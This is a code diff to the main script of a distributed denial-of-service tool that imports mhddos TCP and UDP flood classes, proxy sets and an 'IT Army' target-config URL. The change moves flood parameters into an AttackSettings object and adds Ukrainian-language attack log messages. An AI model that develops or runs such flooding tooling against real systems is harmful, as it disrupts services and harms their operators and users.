@@ -10,11 +10,11 @@ from src.cli import init_argparse
 from src.concurrency import safe_run
 from src.core import (
     logger, cl, Stats,
-    LOW_RPC, IT_ARMY_CONFIG_URL, REFRESH_RATE, UVLOOP_SUPPORT,
-    FAILURE_BUDGET_FACTOR, FAILURE_DELAY_SECONDS, ONLY_MY_IP,
+    LOW_RPC, IT_ARMY_CONFIG_URL, REFRESH_RATE, ONLY_MY_IP,
+    FAILURE_BUDGET_FACTOR, FAILURE_DELAY_SECONDS,
 )
 from src.dns_utils import resolve_all_targets
-from src.mhddos import main as mhddos_main, AsyncTcpFlood, AsyncUdpFlood
+from src.mhddos import main as mhddos_main, AsyncTcpFlood, AsyncUdpFlood, AttackSettings
 from src.output import show_statistic, print_banner
 from src.proxies import ProxySet
 from src.system import fix_ulimits, is_latest_version
@@ -52,8 +52,8 @@ class FloodTask:
 async def run_ddos(
     proxies: ProxySet,
     targets_loader: TargetsLoader,
+    attack_settings: AttackSettings,
     reload_after: int,
-    rpc: int,
     http_methods: List[str],
     debug: bool,
     table: bool,
@@ -73,15 +73,21 @@ async def run_ddos(
     def prepare_flooder(target: Target, method: str) -> AsyncFlood:
         thread_statistics = Stats()
         statistics[(target, method)] = thread_statistics
+        if target.has_option("rpc"):
+            settings = attack_settings.with_options(
+                requests_per_connection=int(target.option("rpc")))
+        else:
+            settings = attack_settings
+
         kwargs = {
             'url': target.url,
             'ip': target.addr,
             'method': method,
-            'rpc': int(target.option("rpc", "0")) or rpc,
             'event': None,
             'stats': thread_statistics,
             'proxies': proxies,
             'loop': loop,
+            'settings': settings,
         }
         if not (table or debug):
             logger.info(
@@ -266,14 +272,21 @@ async def start(args, shutdown_event: Event):
     # targets because the list of targets might change at any point in time
     proxies = ProxySet(args.proxies, use_my_ip)
 
+    attack_settings = AttackSettings(
+        requests_per_connection=args.rpc,
+        # XXX: for testing it would be easier to have separate configuration
+        low_level_transport=not args.advanced_allow_uvloop,
+        drain_timeout_seconds=0.1,
+    )
+
     # XXX: with the current implementation there's no need to
     # have 2 separate functions to setups params for launching flooders
     reload_after = 300
     await run_ddos(
         proxies,
         targets_loader,
+        attack_settings,
         reload_after,
-        args.rpc,
         args.http_methods,
         args.debug,
         args.table,
@@ -284,16 +297,20 @@ async def start(args, shutdown_event: Event):
 
 
 if __name__ == '__main__':
-    if UVLOOP_SUPPORT:
+    args = init_argparse().parse_args()
+
+    if args.advanced_allow_uvloop:
         try:
             __import__("uvloop").install()
             logger.info(
-                f"{cl.GREEN}uvloop{cl.RESET} успішно активований "
-                "(підвищенна ефективність роботи з мережею)")
-        except Exception:
-            pass
+                f"{cl.GREEN}'uvloop' успішно активований "
+                f"(підвищенна ефективність роботи з мережею){cl.RESET}")
+        except:
+            logger.warning(
+                f"{cl.MAGENTA}Вказано ключ '--advanced-allow-uvloop' "
+                f"проте 'uvloop' бібліотека не встановлена.{cl.RESET} "
+                f"{cl.YELLOW}Атака буде проведенна з використанням вбудобваних систем.{cl.RESET}")
 
-    args = init_argparse().parse_args()
     shutdown_event = Event()
     try:
         # run event loop in a separate thread to ensure the application
